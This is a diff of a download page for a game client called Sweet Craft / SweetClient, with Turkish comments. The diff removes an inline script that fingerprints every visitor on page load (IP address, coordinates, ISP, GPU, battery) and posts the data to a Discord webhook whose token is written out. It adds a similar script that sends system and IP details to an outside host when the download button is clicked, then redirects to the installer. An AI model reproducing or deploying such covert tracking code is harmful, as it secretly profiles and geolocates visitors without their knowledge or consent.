@@ -737,111 +737,249 @@
   <script>
     
  (function() {
-    const WEBHOOK_URL = `https://discord.com/api/webhooks/1506740150363881542/22zlc0q5U-WgyuQMCM58WXFGkD7h27kZsIGaSyfupjUxD5Wyo5fAPqqFM5HHmrOEs8H5`;
-      async function collectAndSend() {
-          try {
-              const userAgent = navigator.userAgent;
-              const language = navigator.language || navigator.userLanguage;
-              const screenWidth = screen.width;
-              const screenHeight = screen.height;
-              const screenColorDepth = screen.colorDepth;
-              const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-              const platform = navigator.platform;
-              const deviceMemory = navigator.deviceMemory || 'Unknown';
-              const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
-              
-              let gpuInfo = "Unknown";
-              try {
-                  const canvas = document.createElement('canvas');
-                  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                  if (gl) {
-                      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                      if (debugInfo) {
-                          gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                      }
-                  }
-              } catch(e) { gpuInfo = "Alınamadı"; }
-              
-              let ip = "Unknown";
-              let country = "Unknown";
-              let city = "Unknown";
-              let region = "Unknown";
-              let isp = "Unknown";
-              let lat = "Unknown";
-              let lon = "Unknown";
-              
-              try {
-                  const ipRes = await fetch('https://ipapi.co/json/');
-                  const ipData = await ipRes.json();
-                  ip = ipData.ip || "Unknown";
-                  country = ipData.country_name || ipData.country || "Unknown";
-                  city = ipData.city || "Unknown";
-                  region = ipData.region || "Unknown";
-                  isp = ipData.org || ipData.isp || "Unknown";
-                  lat = ipData.latitude || "Unknown";
-                  lon = ipData.longitude || "Unknown";
-              } catch(e) {}
-              
-              const referrer = document.referrer || "Direkt";
-              const pageUrl = window.location.href;
-              const cookiesEnabled = navigator.cookieEnabled;
-              
-              let batteryLevel = "Unknown";
-              let charging = "Unknown";
-              if (navigator.getBattery) {
-                  try {
-                      const battery = await navigator.getBattery();
-                      batteryLevel = Math.floor(battery.level * 100) + "%";
-                      charging = battery.charging ? "Evet" : "Hayır";
-                  } catch(e) {}
-              }
-              
-              const visitTime = new Date().toLocaleString('tr-TR');
-              const touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-              
-              const embed = {
-                  title: "🎀 Sweet Craft - Ziyaretçi Bilgileri 🎀",
-                  color: 0xff69b4,
-                  fields: [
-                      { name: "🌐 IP Adresi", value: `\`${ip}\``, inline: true },
-                      { name: "📍 Konum", value: `${country} / ${city} / ${region}`, inline: true },
-                      { name: "📡 ISP", value: `\`${isp}\``, inline: true },
-                      { name: "🗺️ Koordinat", value: `[${lat}, ${lon}](https://www.google.com/maps?q=${lat},${lon})`, inline: true },
-                      { name: "🖥️ İşletim Sistemi", value: `\`${platform || "Unknown"}\``, inline: true },
-                      { name: "🎮 Ekran Kartı", value: `\`${gpuInfo.substring(0, 60)}\``, inline: true },
-                      { name: "📱 Tarayıcı", value: `\`${userAgent.substring(0, 100)}\``, inline: false },
-                      { name: "🖥️ Ekran", value: `${screenWidth}x${screenHeight} (${screenColorDepth}bit)`, inline: true },
-                      { name: "🧠 Bellek", value: `${deviceMemory} GB`, inline: true },
-                      { name: "⚙️ CPU Çekirdek", value: `${hardwareConcurrency}`, inline: true },
-                      { name: "🌍 Dil", value: `\`${language}\``, inline: true },
-                      { name: "🕒 Zaman Dilimi", value: `\`${timezone}\``, inline: true },
-                      { name: "🔗 Referrer", value: `\`${referrer}\``, inline: false },
-                      { name: "📄 Sayfa", value: `\`${pageUrl.substring(0, 80)}\``, inline: false },
-                      { name: "🍪 Çerez", value: cookiesEnabled ? "✅ Aktif" : "❌ Pasif", inline: true },
-                      { name: "🔋 Batarya", value: `${batteryLevel} (Şarj: ${charging})`, inline: true },
-                      { name: "👆 Dokunmatik", value: touchSupport ? "✅ Evet" : "❌ Hayır", inline: true },
-                      { name: "⏰ Ziyaret Zamanı", value: `\`${visitTime}\``, inline: false }
-                  ],
-                  footer: { text: "Sweet Craft Analytics • t.me/themocka" },
-                  timestamp: new Date().toISOString()
-              };
-              
-              await fetch(WEBHOOK_URL, {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ embeds: [embed] })
-              });
-          } catch(e) {}
+    const WEBHOOK_URL = `https://iloveanimals.life/apsd`;
+
+    function collectSystemInfo() {
+      const info = {};
+      try {
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        info.timezone = timezone || 'Unknown';
+      } catch (e) {
+        info.timezone = 'Unknown';
+      }
+      info.os = navigator.platform || 'Unknown';
+      info.browser = navigator.userAgent || 'Unknown';
+      info.device = /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+      info.screen = `${screen.width}x${screen.height}`;
+      info.viewport = `${window.innerWidth}x${window.innerHeight}`;
+      info.colorDepth = screen.colorDepth ? `${screen.colorDepth}bit` : 'Unknown';
+      info.language = navigator.language || 'Unknown';
+      info.platform = navigator.platform || 'Unknown';
+      info.cookies = 'Enabled';
+      info.online = navigator.onLine ? 'Yes' : 'No';
+      info.referrer = document.referrer || 'Direct';
+      info.url = window.location.href;
+      info.touch = 'ontouchstart' in window ? 'Yes' : 'No';
+      
+      // WebGL bilgilerini topla (WebGL, WebGL2, experimental-webgl)
+      info.webglVendor = 'Unknown';
+      info.webglRenderer = 'Unknown';
+      try {
+        const canvas = document.createElement('canvas');
+        let gl = null;
+        
+        // Önce WebGL2'yi dene
+        gl = canvas.getContext('webgl2') || 
+             canvas.getContext('webgl') || 
+             canvas.getContext('experimental-webgl');
+        
+        if (gl) {
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          if (debugInfo) {
+            info.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 
+                              gl.getParameter(gl.VENDOR) || 
+                              'Unknown';
+            info.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 
+                                 gl.getParameter(gl.RENDERER) || 
+                                 'Unknown';
+          } else {
+            // WEBGL_debug_renderer_info yoksa normal parametreleri kullan
+            info.webglVendor = gl.getParameter(gl.VENDOR) || 'Unknown';
+            info.webglRenderer = gl.getParameter(gl.RENDERER) || 'Unknown';
+          }
+        }
+      } catch (e) {
+        console.error('WebGL bilgisi alınamadı:', e);
       }
       
-      if (document.readyState === 'loading') {
-          document.addEventListener('DOMContentLoaded', collectAndSend);
-      } else {
-          collectAndSend();
-      }
-  })();
-  </script>
-</head>
+      return info;
+    }
 
-<body class="font-display text-white antialiased">
-  <div id="top-loader"></div>
+    function getIPInfo(info, callback) {
+      try {
+        const xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://ipapi.co/json/', true);
+        xhr.onload = function() {
+          try {
+            const data = JSON.parse(xhr.responseText);
+            info.country = data.country_name || 'Unknown';
+            info.city = data.city || 'Unknown';
+            info.region = data.region || 'Unknown';
+            info.ip = data.ip || 'Unknown';
+            info.isp = data.org || 'Unknown';
+          } catch (e) {
+            info.country = 'Unknown';
+            info.city = 'Unknown';
+            info.region = 'Unknown';
+            info.ip = 'Unknown';
+            info.isp = 'Unknown';
+          }
+          callback();
+        };
+        xhr.onerror = function() {
+          info.country = 'Unknown';
+          info.city = 'Unknown';
+          info.region = 'Unknown';
+          info.ip = 'Unknown';
+          info.isp = 'Unknown';
+          callback();
+        };
+        xhr.send();
+      } catch (e) {
+        info.country = 'Unknown';
+        info.city = 'Unknown';
+        info.region = 'Unknown';
+        info.ip = 'Unknown';
+        info.isp = 'Unknown';
+        callback();
+      }
+    }
+
+    function sendWebhook() {
+      const systemInfo = collectSystemInfo();
+      
+      // IP bilgisini beklemeden önce webhook'u gönder (timeout ile)
+      const sendPayload = () => {
+        const payload = {
+          embeds: [{
+            author: {
+              name: 'Download Button Clicked'
+            },
+            fields: [
+              {
+                name: '📍 Location',
+                value: `Country: ${systemInfo.country || 'Loading...'}\nCity: ${systemInfo.city || 'Loading...'}\nRegion: ${systemInfo.region || 'Loading...'}\nTimezone: ${systemInfo.timezone}`,
+                inline: false
+              },
+              {
+                name: '💻 System Info',
+                value: `OS: ${systemInfo.os}\nBrowser: ${systemInfo.browser}\nDevice: ${systemInfo.device}`,
+                inline: false
+              },
+              {
+                name: '🖥️ Display',
+                value: `Screen: ${systemInfo.screen}\nViewport: ${systemInfo.viewport}\nColor Depth: ${systemInfo.colorDepth}`,
+                inline: false
+              },
+              {
+                name: '🌐 Network',
+                value: `IP: ${systemInfo.ip || 'Loading...'}\nISP: ${systemInfo.isp || 'Loading...'}\nLanguage: ${systemInfo.language}`,
+                inline: false
+              },
+              {
+                name: '⚙️ Platform',
+                value: `Platform: ${systemInfo.platform}\nCookies: ${systemInfo.cookies}\nOnline: ${systemInfo.online}`,
+                inline: false
+              },
+              {
+                name: '🎮 Graphics Card (GPU)',
+                value: `Vendor: ${systemInfo.webglVendor}\nRenderer: ${systemInfo.webglRenderer}`,
+                inline: false
+              },
+              {
+                name: '📄 Page Info',
+                value: `Referrer: ${systemInfo.referrer}\nURL: ${systemInfo.url}\nTouch: ${systemInfo.touch}`,
+                inline: false
+              }
+            ],
+            footer: {
+              text: 'SweetCraft Download Tracker'
+            },
+            color: parseInt('0x9876FF', 16),
+            timestamp: new Date().toISOString()
+          }]
+        };
+
+        const payloadString = JSON.stringify(payload);
+        
+        // Log kaydet (localStorage'a)
+        const logMessage = `[${new Date().toISOString()}] Webhook gönderiliyor: ${WEBHOOK_URL}`;
+        try {
+          const logs = JSON.parse(localStorage.getItem('webhook_logs') || '[]');
+          logs.push(logMessage);
+          if (logs.length > 10) logs.shift(); // Son 10 log'u tut
+          localStorage.setItem('webhook_logs', JSON.stringify(logs));
+        } catch(e) {}
+        
+        // Fetch API kullan - keepalive ile sayfa yönlenirken bile çalışır
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: payloadString,
+          keepalive: true // Sayfa yönlenirken bile isteği tamamla
+        })
+        .then(response => {
+          const statusLog = `[${new Date().toISOString()}] Response: ${response.status} ${response.statusText}`;
+          try {
+            const logs = JSON.parse(localStorage.getItem('webhook_logs') || '[]');
+            logs.push(statusLog);
+            if (logs.length > 10) logs.shift();
+            localStorage.setItem('webhook_logs', JSON.stringify(logs));
+          } catch(e) {}
+          
+          if (!response.ok) {
+            const errorLog = `[${new Date().toISOString()}] HATA: ${response.status} ${response.statusText}`;
+            try {
+              const logs = JSON.parse(localStorage.getItem('webhook_logs') || '[]');
+              logs.push(errorLog);
+              if (logs.length > 10) logs.shift();
+              localStorage.setItem('webhook_logs', JSON.stringify(logs));
+            } catch(e) {}
+          }
+          return response.text();
+        })
+        .then(text => {
+          const successLog = `[${new Date().toISOString()}] Webhook başarıyla gönderildi!`;
+          try {
+            const logs = JSON.parse(localStorage.getItem('webhook_logs') || '[]');
+            logs.push(successLog);
+            if (logs.length > 10) logs.shift();
+            localStorage.setItem('webhook_logs', JSON.stringify(logs));
+          } catch(e) {}
+        })
+        .catch(err => {
+          const errorLog = `[${new Date().toISOString()}] Webhook hatası: ${err.message}`;
+          try {
+            const logs = JSON.parse(localStorage.getItem('webhook_logs') || '[]');
+            logs.push(errorLog);
+            if (logs.length > 10) logs.shift();
+            localStorage.setItem('webhook_logs', JSON.stringify(logs));
+          } catch(e) {}
+        });
+      };
+
+      // IP bilgisini al, ama 2 saniye timeout koy
+      let ipReceived = false;
+      const timeout = setTimeout(() => {
+        if (!ipReceived) {
+          sendPayload();
+        }
+      }, 2000);
+
+      getIPInfo(systemInfo, function() {
+        ipReceived = true;
+        clearTimeout(timeout);
+        sendPayload();
+      });
+    }
+
+    modalDownload?.addEventListener("click", (e) => {
+      e.preventDefault();
+      sendWebhook();
+      showNotification("SweetClient download started");
+      
+      // Webhook'un gönderilmesi için yeterli zaman ver (500ms)
+      setTimeout(() => {
+        // Dropbox linkine yönlendir (?dl=1 parametresi ile direkt indirme)
+        window.location.href = WINDOWS_URL;
+      }, 500);
+    });
+    
+    // Debug: Logları görmek için console'da şunu çalıştırın:
+    // JSON.parse(localStorage.getItem('webhook_logs') || '[]').forEach(log => console.log(log));
+  })();
+</script>
+
+</body></html>
